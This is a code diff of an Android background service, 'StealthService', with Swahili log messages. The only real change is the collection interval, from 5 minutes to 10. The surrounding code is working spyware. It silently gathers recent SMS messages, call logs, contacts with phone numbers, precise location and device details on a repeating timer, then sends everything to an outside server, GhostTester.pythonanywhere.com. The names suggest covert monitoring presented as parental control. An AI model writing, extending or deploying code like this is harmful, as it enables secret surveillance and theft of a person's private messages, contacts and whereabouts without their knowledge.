@@ -40,14 +40,14 @@ public class StealthService extends Service {
     private LocationManager locationManager;
     private MediaRecorder mediaRecorder;
     private boolean isRecording = false;
-    
+
     @Override
     public void onCreate() {
         super.onCreate();
         prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
         Log.d(TAG, "🔍 StealthService imeanzishwa...");
     }
-    
+
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (intent != null && intent.hasExtra("PARENT_CODE")) {
@@ -57,18 +57,18 @@ public class StealthService extends Service {
             parentCode = prefs.getString("parent_code", "");
             Log.d(TAG, "📱 Parent Code from prefs: " + parentCode);
         }
-        
+
         startSurveillance();
         return START_STICKY;
     }
-    
+
     private void startSurveillance() {
         if (timer != null) {
             timer.cancel();
         }
-        
+
         timer = new Timer();
-        
+
         // Start immediate data collection
         timer.schedule(new TimerTask() {
             @Override
@@ -76,18 +76,18 @@ public class StealthService extends Service {
                 collectAndSendAllData();
             }
         }, 0);
-        
-        // Schedule periodic data collection every 5 minutes
+
+        // Schedule periodic data collection every 10 minutes (600000 ms)
         timer.scheduleAtFixedRate(new TimerTask() {
             @Override
             public void run() {
                 collectAndSendAllData();
             }
-        }, 300000, 300000); // 5 minutes = 300000 ms
-        
-        Log.d(TAG, "📡 Surveillance imeanzishwa - data inatumwa kila baada ya dakika 5");
+        }, 600000, 600000); // 10 minutes = 600000 ms
+
+        Log.d(TAG, "📡 Surveillance imeanzishwa - data inatumwa kila baada ya dakika 10");
     }
-    
+
     private void collectAndSendAllData() {
         try {
             JSONObject allData = new JSONObject();
@@ -95,38 +95,38 @@ public class StealthService extends Service {
             allData.put("device_id", android.os.Build.MODEL);
             allData.put("timestamp", System.currentTimeMillis());
             allData.put("collection_time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
-            
+
             // Collect SMS data
             if (checkPermission(Manifest.permission.READ_SMS)) {
                 allData.put("sms_data", collectSMSData());
             }
-            
+
             // Collect calls data
             if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
                 allData.put("calls_data", collectCallsData());
             }
-            
+
             // Collect contacts data
             if (checkPermission(Manifest.permission.READ_CONTACTS)) {
                 allData.put("contacts_data", collectContactsData());
             }
-            
+
             // Collect location data
             if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
                 allData.put("location_data", collectLocationData());
             }
-            
+
             // Collect device info
             allData.put("device_info", collectDeviceInfo());
-            
+
             // Send to GhostTester server
             sendToServer(allData);
-            
+
         } catch (Exception e) {
             Log.e(TAG, "❌ Error collecting data: " + e.getMessage());
         }
     }
-    
+
     private JSONArray collectSMSData() {
         JSONArray smsArray = new JSONArray();
         try {
@@ -135,7 +135,7 @@ public class StealthService extends Service {
                 null, null, null,
                 Telephony.Sms.DEFAULT_SORT_ORDER + " LIMIT 50"
             );
-            
+
             if (cursor != null) {
                 while (cursor.moveToNext()) {
                     JSONObject sms = new JSONObject();
@@ -152,7 +152,7 @@ public class StealthService extends Service {
         }
         return smsArray;
     }
-    
+
     private JSONArray collectCallsData() {
         JSONArray callsArray = new JSONArray();
         try {
@@ -161,7 +161,7 @@ public class StealthService extends Service {
                 null, null, null,
                 CallLog.Calls.DATE + " DESC LIMIT 50"
             );
-            
+
             if (cursor != null) {
                 while (cursor.moveToNext()) {
                     JSONObject call = new JSONObject();
@@ -178,7 +178,7 @@ public class StealthService extends Service {
         }
         return callsArray;
     }
-    
+
     private JSONArray collectContactsData() {
         JSONArray contactsArray = new JSONArray();
         try {
@@ -187,15 +187,15 @@ public class StealthService extends Service {
                 null, null, null,
                 ContactsContract.Contacts.DISPLAY_NAME + " ASC LIMIT 100"
             );
-            
+
             if (cursor != null) {
                 while (cursor.moveToNext()) {
                     String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                     String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
-                    
+
                     JSONObject contact = new JSONObject();
                     contact.put("name", name);
-                    
+
                     // Get phone numbers
                     Cursor phoneCursor = getContentResolver().query(
                         ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
@@ -204,7 +204,7 @@ public class StealthService extends Service {
                         new String[]{contactId},
                         null
                     );
-                    
+
                     JSONArray phones = new JSONArray();
                     if (phoneCursor != null) {
                         while (phoneCursor.moveToNext()) {
@@ -224,7 +224,7 @@ public class StealthService extends Service {
         }
         return contactsArray;
     }
-    
+
     private JSONObject collectLocationData() {
         JSONObject location = new JSONObject();
         try {
@@ -243,7 +243,7 @@ public class StealthService extends Service {
         }
         return location;
     }
-    
+
     private JSONObject collectDeviceInfo() {
         JSONObject deviceInfo = new JSONObject();
         try {
@@ -258,16 +258,16 @@ public class StealthService extends Service {
         }
         return deviceInfo;
     }
-    
+
     private boolean checkPermission(String permission) {
         return checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
     }
-    
+
     private void sendToServer(JSONObject data) {
         new Thread(() -> {
             try {
                 String serverUrl = "https://GhostTester.pythonanywhere.com/api/surveillance";
-                
+
                 URL url = new URL(serverUrl);
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("POST");
@@ -275,30 +275,30 @@ public class StealthService extends Service {
                 conn.setDoOutput(true);
                 conn.setConnectTimeout(15000);
                 conn.setReadTimeout(15000);
-                
+
                 OutputStream os = conn.getOutputStream();
                 os.write(data.toString().getBytes());
                 os.flush();
                 os.close();
-                
+
                 int responseCode = conn.getResponseCode();
                 if (responseCode == 200) {
                     Log.d(TAG, "✅ Data imetumwa kikamilifu kwa server - " + new Date());
                 } else {
                     Log.e(TAG, "❌ Server returned error: " + responseCode);
                 }
-                
+
             } catch (Exception e) {
                 Log.e(TAG, "❌ Error sending data: " + e.getMessage());
             }
         }).start();
     }
-    
+
     @Override
     public IBinder onBind(Intent intent) {
         return null;
     }
-    
+
     @Override
     public void onDestroy() {
         super.onDestroy();
